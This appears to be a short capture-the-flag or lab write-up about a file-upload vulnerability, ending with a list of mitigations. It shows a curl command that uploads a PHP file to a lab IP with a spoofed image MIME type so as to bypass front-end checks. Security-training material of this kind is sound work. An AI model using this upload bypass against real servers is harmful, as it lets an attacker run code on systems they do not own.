# EXPLANATION

We want to inject a php script using the file upload page, to override the frontend validation we use CURL to make a POST request to the server.

We will use the -F (--form) option in order to upload a file with CURL.

``curl POST -F 'Upload=Upload' -F 'uploaded=@/Users/isifeddi/Desktop/ilyas.php;type=image/jpeg' 'http://10.12.100.44/?page=upload'``

# UTILITY

A local file upload vulnerability is a vulnerability where an application allows a user to upload a malicious file directly which is then executed :)

# HOW TO AVOID ?

Only allow specific file extensions.
Only allow authorized and authenticated users to use the feature.
verify the filesize
check the permission of the file
